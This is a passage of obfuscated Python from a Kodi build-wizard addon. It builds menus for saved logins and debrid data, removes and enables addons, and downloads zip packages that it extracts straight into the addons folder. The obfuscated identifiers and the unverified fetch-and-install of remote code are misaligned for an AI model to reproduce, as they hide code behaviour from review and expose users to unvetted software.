			if os .path .exists (O000O0O000OO00000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O000O0000OOOOOO0O ,icon =O00O0OOOOOOO000O0 ,fanart =OOOO0000OOO0OO0O0 ,menu =O0O000OOOOO0O0O0O )#line:3010
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O000O0000OOOOOO0O ,icon =O00O0OOOOOOO000O0 ,fanart =OOOO0000OOO0OO0O0 ,menu =O0O000OOOOO0O0O0O )#line:3011
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00OOOOOO0O0O0OOO ,'',icon =O00O0OOOOOOO000O0 ,fanart =OOOO0000OOO0OO0O0 ,menu =O0O000OOOOO0O0O0O )#line:3012
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3014
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3015
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3016
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3017
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3018
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3019
	setView ('files','viewType')#line:3020
def loginMenu ():#line:3022
	OO00000O0OO0OOOO0 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3023
	O0OO00O0OO0O0O0O0 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3024
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3025
	addFile ('Save Login Data: %s'%OO00000O0OO0OOOO0 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3026
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O0OO00O0OO0O0O0O0 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3027
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3028
	for OO00000O0OO0OOOO0 in loginit .ORDER :#line:3030
		OO000O0O00O0OO0OO =LOGINID [OO00000O0OO0OOOO0 ]['name']#line:3031
		O0OOOO00OO0O0OOO0 =LOGINID [OO00000O0OO0OOOO0 ]['path']#line:3032
		O00O00O000000OO0O =LOGINID [OO00000O0OO0OOOO0 ]['saved']#line:3033
		OO0OO0OOOOO0O0000 =LOGINID [OO00000O0OO0OOOO0 ]['file']#line:3034
		O0O00OOOO0OOOO00O =wiz .getS (O00O00O000000OO0O )#line:3035
		OO00OOO0O0O000000 =loginit .loginUser (OO00000O0OO0OOOO0 )#line:3036
		O0OOOO0O0000O0O0O =LOGINID [OO00000O0OO0OOOO0 ]['icon']if os .path .exists (O0OOOO00OO0O0OOO0 )else ICONLOGIN #line:3037
		OO0O000OO0O00OOO0 =LOGINID [OO00000O0OO0OOOO0 ]['fanart']if os .path .exists (O0OOOO00OO0O0OOO0 )else FANART #line:3038
		OO0O00000OOOO0OO0 =createMenu ('saveaddon','Login',OO00000O0OO0OOOO0 )#line:3039
		O00000O00OO00000O =createMenu ('save','Login',OO00000O0OO0OOOO0 )#line:3040
		OO0O00000OOOO0OO0 .append ((THEME2 %'%s Settings'%OO000O0O00O0OO0OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OO00000O0OO0OOOO0 )))#line:3041
		addFile ('[+]-> %s'%OO000O0O00O0OO0OO ,'',icon =O0OOOO0O0000O0O0O ,fanart =OO0O000OO0O00OOO0 ,themeit =THEME3 )#line:3043
		if not os .path .exists (O0OOOO00OO0O0OOO0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OOOO0O0000O0O0O ,fanart =OO0O000OO0O00OOO0 ,menu =OO0O00000OOOO0OO0 )#line:3044
		elif not OO00OOO0O0O000000 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OO00000O0OO0OOOO0 ,icon =O0OOOO0O0000O0O0O ,fanart =OO0O000OO0O00OOO0 ,menu =OO0O00000OOOO0OO0 )#line:3045
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO00OOO0O0O000000 ,'authlogin',OO00000O0OO0OOOO0 ,icon =O0OOOO0O0000O0O0O ,fanart =OO0O000OO0O00OOO0 ,menu =OO0O00000OOOO0OO0 )#line:3046
		if O0O00OOOO0OOOO00O =="":#line:3047
			if os .path .exists (OO0OO0OOOOO0O0000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OO00000O0OO0OOOO0 ,icon =O0OOOO0O0000O0O0O ,fanart =OO0O000OO0O00OOO0 ,menu =O00000O00OO00000O )#line:3048
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OO00000O0OO0OOOO0 ,icon =O0OOOO0O0000O0O0O ,fanart =OO0O000OO0O00OOO0 ,menu =O00000O00OO00000O )#line:3049
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O00OOOO0OOOO00O ,'',icon =O0OOOO0O0000O0O0O ,fanart =OO0O000OO0O00OOO0 ,menu =O00000O00OO00000O )#line:3050
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3052
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3053
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3054
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3055
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3056
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3057
	setView ('files','viewType')#line:3058
def fixUpdate ():#line:3060
	if KODIV <17 :#line:3061
		O0OOO00OOO00OO00O =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3062
		try :#line:3063
			os .remove (O0OOO00OOO00OO00O )#line:3064
		except Exception as OO0OO0O0OOO0O0O0O :#line:3065
			wiz .log ("Unable to remove %s, Purging DB"%O0OOO00OOO00OO00O )#line:3066
			wiz .purgeDb (O0OOO00OOO00OO00O )#line:3067
	else :#line:3068
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3069
def removeAddonMenu ():#line:3071
	O00OO00O00O00000O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3072
	O0000OO0000OO0OOO =[];O0O00OO00O0O0O0OO =[]#line:3073
	for OO00000O0OOOOOOOO in sorted (O00OO00O00O00000O ,key =lambda OO0O00O00O0O0OO0O :OO0O00O00O0O0OO0O ):#line:3074
		OOOOO00O0OO00000O =os .path .split (OO00000O0OOOOOOOO [:-1 ])[1 ]#line:3075
		if OOOOO00O0OO00000O in EXCLUDES :continue #line:3076
		elif OOOOO00O0OO00000O in DEFAULTPLUGINS :continue #line:3077
		elif OOOOO00O0OO00000O =='packages':continue #line:3078
		O00OO0OO000O00OO0 =os .path .join (OO00000O0OOOOOOOO ,'addon.xml')#line:3079
		if os .path .exists (O00OO0OO000O00OO0 ):#line:3080
			OOO00OO0O0OO0O000 =open (O00OO0OO000O00OO0 )#line:3081
			O000O00O00OO0000O =OOO00OO0O0OO0O000 .read ()#line:3082
			OOO00OOO00OO0OOOO =wiz .parseDOM (O000O00O00OO0000O ,'addon',ret ='id')#line:3083
			OOO0O00OO0OO00OO0 =OOOOO00O0OO00000O if len (OOO00OOO00OO0OOOO )==0 else OOO00OOO00OO0OOOO [0 ]#line:3085
			try :#line:3086
				OOO0OOOOOO00OO0O0 =xbmcaddon .Addon (id =OOO0O00OO0OO00OO0 )#line:3087
				O0000OO0000OO0OOO .append (OOO0OOOOOO00OO0O0 .getAddonInfo ('name'))#line:3088
				O0O00OO00O0O0O0OO .append (OOO0O00OO0OO00OO0 )#line:3089
			except :#line:3090
				pass #line:3091
	if len (O0000OO0000OO0OOO )==0 :#line:3092
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3093
		return #line:3094
	if KODIV >16 :#line:3095
		O0O0O0O00O00OOO0O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0000OO0000OO0OOO )#line:3096
	else :#line:3097
		O0O0O0O00O00OOO0O =[];OO0O0O000OOOOO0O0 =0 #line:3098
		OO0O0O000O0O000O0 =["-- Click here to Continue --"]+O0000OO0000OO0OOO #line:3099
		while not OO0O0O000OOOOO0O0 ==-1 :#line:3100
			OO0O0O000OOOOO0O0 =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO0O0O000O0O000O0 )#line:3101
			if OO0O0O000OOOOO0O0 ==-1 :break #line:3102
			elif OO0O0O000OOOOO0O0 ==0 :break #line:3103
			else :#line:3104
				OO0OOOO0OOOOO0O0O =(OO0O0O000OOOOO0O0 -1 )#line:3105
				if OO0OOOO0OOOOO0O0O in O0O0O0O00O00OOO0O :#line:3106
					O0O0O0O00O00OOO0O .remove (OO0OOOO0OOOOO0O0O )#line:3107
					OO0O0O000O0O000O0 [OO0O0O000OOOOO0O0 ]=O0000OO0000OO0OOO [OO0OOOO0OOOOO0O0O ]#line:3108
				else :#line:3109
					O0O0O0O00O00OOO0O .append (OO0OOOO0OOOOO0O0O )#line:3110
					OO0O0O000O0O000O0 [OO0O0O000OOOOO0O0 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0000OO0000OO0OOO [OO0OOOO0OOOOO0O0O ])#line:3111
	if O0O0O0O00O00OOO0O ==None :return #line:3112
	if len (O0O0O0O00O00OOO0O )>0 :#line:3113
		wiz .addonUpdates ('set')#line:3114
		for O000OOO000O0O0OOO in O0O0O0O00O00OOO0O :#line:3115
			removeAddon (O0O00OO00O0O0O0OO [O000OOO000O0O0OOO ],O0000OO0000OO0OOO [O000OOO000O0O0OOO ],True )#line:3116
		xbmc .sleep (1000 )#line:3118
		if INSTALLMETHOD ==1 :O0O0000000O00OOO0 =1 #line:3120
		elif INSTALLMETHOD ==2 :O0O0000000O00OOO0 =0 #line:3121
		else :O0O0000000O00OOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3122
		if O0O0000000O00OOO0 ==1 :wiz .reloadFix ('remove addon')#line:3123
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3124
def removeAddonDataMenu ():#line:3126
	if os .path .exists (ADDOND ):#line:3127
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3128
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3129
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3130
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3131
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3132
		OO0OOOOOOOOO0O000 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3133
		for OO0OOO000OOOOOO00 in sorted (OO0OOOOOOOOO0O000 ,key =lambda O00000OOO0O0O00OO :O00000OOO0O0O00OO ):#line:3134
			OO0O00O0OO000OO0O =OO0OOO000OOOOOO00 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3135
			OO0O0O0OOO0O000OO =os .path .join (OO0OOO000OOOOOO00 .replace (ADDOND ,ADDONS ),'icon.png')#line:3136
			OOOO0O0O0OO00O0O0 =os .path .join (OO0OOO000OOOOOO00 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3137
			O0O0O000O0OO0OOOO =OO0O00O0OO000OO0O #line:3138
			O0OO0O0O0OOOO000O ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3139
			for O000O0O0O0O0OO000 in O0OO0O0O0OOOO000O :#line:3140
				O0O0O000O0OO0OOOO =O0O0O000O0OO0OOOO .replace (O000O0O0O0O0OO000 ,O0OO0O0O0OOOO000O [O000O0O0O0O0OO000 ])#line:3141
			if OO0O00O0OO000OO0O in EXCLUDES :O0O0O000O0OO0OOOO ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O0O0O000O0OO0OOOO #line:3142
			else :O0O0O000O0OO0OOOO ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O0O0O000O0OO0OOOO #line:3143
			addFile (' %s'%O0O0O000O0OO0OOOO ,'removedata',OO0O00O0OO000OO0O ,icon =OO0O0O0OOO0O000OO ,fanart =OOOO0O0O0OO00O0O0 ,themeit =THEME2 )#line:3144
	else :#line:3145
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3146
	setView ('files','viewType')#line:3147
def enableAddons ():#line:3149
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3150
	O0O00000000OO0O00 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3151
	OOOOO0000000O000O =0 #line:3152
	for O00OOOOO0OOO000O0 in sorted (O0O00000000OO0O00 ,key =lambda OO000O00000O0OO00 :OO000O00000O0OO00 ):#line:3153
		O0OOOO0000OOO00O0 =os .path .split (O00OOOOO0OOO000O0 [:-1 ])[1 ]#line:3154
		if O0OOOO0000OOO00O0 in EXCLUDES :continue #line:3155
		if O0OOOO0000OOO00O0 in DEFAULTPLUGINS :continue #line:3156
		O0O00000O0000O000 =os .path .join (O00OOOOO0OOO000O0 ,'addon.xml')#line:3157
		if os .path .exists (O0O00000O0000O000 ):#line:3158
			OOOOO0000000O000O +=1 #line:3159
			O0O00000000OO0O00 =O00OOOOO0OOO000O0 .replace (ADDONS ,'')[1 :-1 ]#line:3160
			O0000OOO0O0O0000O =open (O0O00000O0000O000 )#line:3161
			O0O00OOOOO0OO0O00 =O0000OOO0O0O0000O .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3162
			O0O0O0OO0000000OO =wiz .parseDOM (O0O00OOOOO0OO0O00 ,'addon',ret ='id')#line:3163
			OOOO00OOO0OOO00OO =wiz .parseDOM (O0O00OOOOO0OO0O00 ,'addon',ret ='name')#line:3164
			try :#line:3165
				O0000O0O0O0000000 =O0O0O0OO0000000OO [0 ]#line:3166
				O000OOOOO0000OOO0 =OOOO00OOO0OOO00OO [0 ]#line:3167
			except :#line:3168
				continue #line:3169
			try :#line:3170
				OOOO0OOO00OO0O0OO =xbmcaddon .Addon (id =O0000O0O0O0000000 )#line:3171
				OOOOOOOO0O000OOOO ="[COLOR green][Enabled][/COLOR]"#line:3172
				O0O0OOOOO0O0OO0OO ="false"#line:3173
			except :#line:3174
				OOOOOOOO0O000OOOO ="[COLOR red][Disabled][/COLOR]"#line:3175
				O0O0OOOOO0O0OO0OO ="true"#line:3176
				pass #line:3177
			O0O000000OO000OOO =os .path .join (O00OOOOO0OOO000O0 ,'icon.png')if os .path .exists (os .path .join (O00OOOOO0OOO000O0 ,'icon.png'))else ICON #line:3178
			O0O0O000O00O0O000 =os .path .join (O00OOOOO0OOO000O0 ,'fanart.jpg')if os .path .exists (os .path .join (O00OOOOO0OOO000O0 ,'fanart.jpg'))else FANART #line:3179
			addFile ("%s %s"%(OOOOOOOO0O000OOOO ,O000OOOOO0000OOO0 ),'toggleaddon',O0O00000000OO0O00 ,O0O0OOOOO0O0OO0OO ,icon =O0O000000OO000OOO ,fanart =O0O0O000O00O0O000 )#line:3180
			O0000OOO0O0O0000O .close ()#line:3181
	if OOOOO0000000O000O ==0 :#line:3182
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3183
	setView ('files','viewType')#line:3184
def changeFeq ():#line:3186
	OO0OO000OOOO0OOOO =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3187
	OO0000O00OO0000O0 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OO0OO000OOOO0OOOO )#line:3188
	if not OO0000O00OO0000O0 ==-1 :#line:3189
		wiz .setS ('autocleanfeq',str (OO0000O00OO0000O0 ))#line:3190
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OO0OO000OOOO0OOOO [OO0000O00OO0000O0 ]))#line:3191
def developer ():#line:3193
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3194
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3195
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3196
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3197
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3198
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3199
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3200
	setView ('files','viewType')#line:3202
def download (OO00OO000O0OO0000 ,OOO0OOO0O0OOO0O00 ):#line:3207
  O0O0O0OOO0OOOOO0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3208
  OO0OO0OO0O00O0OO0 =xbmcgui .DialogProgress ()#line:3209
  OO0OO0OO0O00O0OO0 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3210
  OOOO00OO00O000OO0 =os .path .join (O0O0O0OOO0OOOOO0O ,'isr.zip')#line:3211
  O0O0OO0O0OO0000O0 =urllib2 .Request (OO00OO000O0OO0000 )#line:3212
  O0OO0O000000OOO00 =urllib2 .urlopen (O0O0OO0O0OO0000O0 )#line:3213
  O0O0OOOOO00O00O0O =xbmcgui .DialogProgress ()#line:3215
  O0O0OOOOO00O00O0O .create ("Downloading","Downloading "+name )#line:3216
  O0O0OOOOO00O00O0O .update (0 )#line:3217
  OO0O00000OO0O00O0 =OOO0OOO0O0OOO0O00 #line:3218
  O00O0OOO0OO0O0OO0 =open (OOOO00OO00O000OO0 ,'wb')#line:3219
  try :#line:3221
    OO000OO0OOOOO0OOO =O0OO0O000000OOO00 .info ().getheader ('Content-Length').strip ()#line:3222
    OOOOOO0OOO000000O =True #line:3223
  except AttributeError :#line:3224
        OOOOOO0OOO000000O =False #line:3225
  if OOOOOO0OOO000000O :#line:3227
        OO000OO0OOOOO0OOO =int (OO000OO0OOOOO0OOO )#line:3228
  O0OOOOO0OO00OO0OO =0 #line:3230
  OOO00OOO0OOO0OO00 =time .time ()#line:3231
  while True :#line:3232
        OOOO0OOO0O00OOO0O =O0OO0O000000OOO00 .read (8192 )#line:3233
        if not OOOO0OOO0O00OOO0O :#line:3234
            sys .stdout .write ('\n')#line:3235
            break #line:3236
        O0OOOOO0OO00OO0OO +=len (OOOO0OOO0O00OOO0O )#line:3238
        O00O0OOO0OO0O0OO0 .write (OOOO0OOO0O00OOO0O )#line:3239
        if not OOOOOO0OOO000000O :#line:3241
            OO000OO0OOOOO0OOO =O0OOOOO0OO00OO0OO #line:3242
        if O0O0OOOOO00O00O0O .iscanceled ():#line:3243
           O0O0OOOOO00O00O0O .close ()#line:3244
           try :#line:3245
            os .remove (OOOO00OO00O000OO0 )#line:3246
           except :#line:3247
            pass #line:3248
           break #line:3249
        O0000OO0000O00OO0 =float (O0OOOOO0OO00OO0OO )/OO000OO0OOOOO0OOO #line:3250
        O0000OO0000O00OO0 =round (O0000OO0000O00OO0 *100 ,2 )#line:3251
        OOO00O000000OOO0O =O0OOOOO0OO00OO0OO /(1024 *1024 )#line:3252
        O000OO0O000OO0OOO =OO000OO0OOOOO0OOO /(1024 *1024 )#line:3253
        OOOOO00OO00O000OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO00O000000OOO0O ,'teal',O000OO0O000OO0OOO )#line:3254
        if (time .time ()-OOO00OOO0OOO0OO00 )>0 :#line:3255
          OOO000OOO0000OO00 =O0OOOOO0OO00OO0OO /(time .time ()-OOO00OOO0OOO0OO00 )#line:3256
          OOO000OOO0000OO00 =OOO000OOO0000OO00 /1024 #line:3257
        else :#line:3258
         OOO000OOO0000OO00 =0 #line:3259
        OO0OO0OOO0OOOOOO0 ='KB'#line:3260
        if OOO000OOO0000OO00 >=1024 :#line:3261
           OOO000OOO0000OO00 =OOO000OOO0000OO00 /1024 #line:3262
           OO0OO0OOO0OOOOOO0 ='MB'#line:3263
        if OOO000OOO0000OO00 >0 and not O0000OO0000O00OO0 ==100 :#line:3264
            O0OO0O0OOOOOOO00O =(OO000OO0OOOOO0OOO -O0OOOOO0OO00OO0OO )/OOO000OOO0000OO00 #line:3265
        else :#line:3266
            O0OO0O0OOOOOOO00O =0 #line:3267
        O0O0OO0OO00O00O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO000OOO0000OO00 ,OO0OO0OOO0OOOOOO0 )#line:3268
        O0O0OOOOO00O00O0O .update (int (O0000OO0000O00OO0 ),"Downloading "+name ,OOOOO00OO00O000OO ,O0O0OO0OO00O00O00 )#line:3270
  OOO0O0OO0OO000OO0 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3273
  O00O0OOO0OO0O0OO0 .close ()#line:3275
  extract (OOOO00OO00O000OO0 ,OOO0O0OO0OO000OO0 ,O0O0OOOOO00O00O0O )#line:3277
  if os .path .exists (OOO0O0OO0OO000OO0 +'/scakemyer-script.quasar.burst'):#line:3278
    if os .path .exists (OOO0O0OO0OO000OO0 +'/script.quasar.burst'):#line:3279
     shutil .rmtree (OOO0O0OO0OO000OO0 +'/script.quasar.burst',ignore_errors =False )#line:3280
    os .rename (OOO0O0OO0OO000OO0 +'/scakemyer-script.quasar.burst',OOO0O0OO0OO000OO0 +'/script.quasar.burst')#line:3281
  if os .path .exists (OOO0O0OO0OO000OO0 +'/plugin.video.kmediatorrent-master'):#line:3283
    if os .path .exists (OOO0O0OO0OO000OO0 +'/plugin.video.kmediatorrent'):#line:3284
     shutil .rmtree (OOO0O0OO0OO000OO0 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3285
    os .rename (OOO0O0OO0OO000OO0 +'/plugin.video.kmediatorrent-master',OOO0O0OO0OO000OO0 +'/plugin.video.kmediatorrent')#line:3286
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3287
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3288
  try :#line:3289
    os .remove (OOOO00OO00O000OO0 )#line:3290
  except :#line:3291
    pass #line:3292
  O0O0OOOOO00O00O0O .close ()#line:3293
def dis_or_enable_addon (OO0OOOO0OO00O0000 ,OOOOO000OO00000O0 ,enable ="true"):#line:3294
    import json #line:3295
    O0O0O0O0OOOO000OO ='"%s"'%OO0OOOO0OO00O0000 #line:3296
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0OOOO0OO00O0000 )and enable =="true":#line:3297
        logging .warning ('already Enabled')#line:3298
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO0OOOO0OO00O0000 )#line:3299
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0OOOO0OO00O0000 )and enable =="false":#line:3300
        return xbmc .log ("### Skipped %s, reason = not installed"%OO0OOOO0OO00O0000 )#line:3301
    else :#line:3302
        OO0O000O0O00OOOOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0O0O0O0OOOO000OO ,enable )#line:3303
        O0O00O0O00OOO00O0 =xbmc .executeJSONRPC (OO0O000O0O00OOOOO )#line:3304
        OO0O0OO0O0O0O00OO =json .loads (O0O00O0O00OOO00O0 )#line:3305
        if enable =="true":#line:3306
            xbmc .log ("### Enabled %s, response = %s"%(OO0OOOO0OO00O0000 ,OO0O0OO0O0O0O00OO ))#line:3307
        else :#line:3308
            xbmc .log ("### Disabled %s, response = %s"%(OO0OOOO0OO00O0000 ,OO0O0OO0O0O0O00OO ))#line:3309
    if OOOOO000OO00000O0 =='auto':#line:3310
     return True #line:3311
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3312
def chunk_report (O0O00OO00OO000O0O ,OO0OO00OO0O0000OO ,O00OO0O0000OO0O00 ):#line:3313
   O0OO00O0O0OOO00O0 =float (O0O00OO00OO000O0O )/O00OO0O0000OO0O00 #line:3314
   O0OO00O0O0OOO00O0 =round (O0OO00O0O0OOO00O0 *100 ,2 )#line:3315
   if O0O00OO00OO000O0O >=O00OO0O0000OO0O00 :#line:3317
      sys .stdout .write ('\n')#line:3318
def chunk_read (OOOOO0O0O00OOOOO0 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3320
   import time #line:3321
   OO0OO0000O0OOOOOO =int (filesize )*1000000 #line:3322
   O0OO0O0O0OOOOO000 =0 #line:3324
   O0OO0OO0OO00000OO =time .time ()#line:3325
   OOOO0OO0000O00000 =0 #line:3326
   logging .warning ('Downloading')#line:3328
   with open (destination ,"wb")as O000O0OO0O0O0O00O :#line:3329
    while 1 :#line:3330
      O00OOO0OOOOOOO00O =time .time ()-O0OO0OO0OO00000OO #line:3331
      OO00O00OOO000000O =int (OOOO0OO0000O00000 *chunk_size )#line:3332
      O0O0O0000000O000O =OOOOO0O0O00OOOOO0 .read (chunk_size )#line:3333
      O000O0OO0O0O0O00O .write (O0O0O0000000O000O )#line:3334
      O000O0OO0O0O0O00O .flush ()#line:3335
      O0OO0O0O0OOOOO000 +=len (O0O0O0000000O000O )#line:3336
      O0OO000O0O0O0O0O0 =float (O0OO0O0O0OOOOO000 )/OO0OO0000O0OOOOOO #line:3337
      O0OO000O0O0O0O0O0 =round (O0OO000O0O0O0O0O0 *100 ,2 )#line:3338
      if int (O00OOO0OOOOOOO00O )>0 :#line:3339
        O0O0OOO00OOOO00O0 =int (OO00O00OOO000000O /(1024 *O00OOO0OOOOOOO00O ))#line:3340
      else :#line:3341
         O0O0OOO00OOOO00O0 =0 #line:3342
      if O0O0OOO00OOOO00O0 >1024 and not O0OO000O0O0O0O0O0 ==100 :#line:3343
          OOOOOO0O0OO00OOOO =int (((OO0OO0000O0OOOOOO -OO00O00OOO000000O )/1024 )/(O0O0OOO00OOOO00O0 ))#line:3344
      else :#line:3345
          OOOOOO0O0OO00OOOO =0 #line:3346
      if OOOOOO0O0OO00OOOO <0 :#line:3347
        OOOOOO0O0OO00OOOO =0 #line:3348
      dp .update (int (O0OO000O0O0O0O0O0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0OO000O0O0O0O0O0 ,OO00O00OOO000000O /(1024 *1024 ),OO0OO0000O0OOOOOO /(1000 *1000 ),O0O0OOO00OOOO00O0 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOOOOO0O0OO00OOOO ,60 ))#line:3349
      if dp .iscanceled ():#line:3350
         dp .close ()#line:3351
         break #line:3352
      if not O0O0O0000000O000O :#line:3353
         break #line:3354
      if report_hook :#line:3356
         report_hook (O0OO0O0O0OOOOO000 ,chunk_size ,OO0OO0000O0OOOOOO )#line:3357
      OOOO0OO0000O00000 +=1 #line:3358
   logging .warning ('END Downloading')#line:3359
   return O0OO0O0O0OOOOO000 #line:3360
def googledrive_download (O0OOO0OO0OO0OOOO0 ,O0O000O0000OO0OO0 ,OOO0O0OO0000OOO0O ,O0OOO000OOO0O0000 ):#line:3362
    OO00O0OOO000O000O =[]#line:3366
    OO0000O00000OOOO0 =O0OOO0OO0OO0OOOO0 .split ('=')#line:3367
    O0OOO0OO0OO0OOOO0 =OO0000O00000OOOO0 [len (OO0000O00000OOOO0 )-1 ]#line:3368
    def O0O00O0OO000O0O00 (OO0O0OO00O00O0000 ):#line:3370
        for OO0O0000000O0OOO0 in OO0O0OO00O00O0000 :#line:3372
            logging .warning ('cookie.name')#line:3373
            logging .warning (OO0O0000000O0OOO0 .name )#line:3374
            O000000O0O0000O0O =OO0O0000000O0OOO0 .value #line:3375
            if 'download_warning'in OO0O0000000O0OOO0 .name :#line:3376
                logging .warning (OO0O0000000O0OOO0 .value )#line:3377
                logging .warning ('cookie.value')#line:3378
                return OO0O0000000O0OOO0 .value #line:3379
            return O000000O0O0000O0O #line:3380
        return None #line:3382
    def OOOO0OO00OOO00OOO (O0O000O000O0OO00O ,OOO0OOOOO0O00O00O ):#line:3384
        OOOO0OOOOOOO000O0 =32768 #line:3386
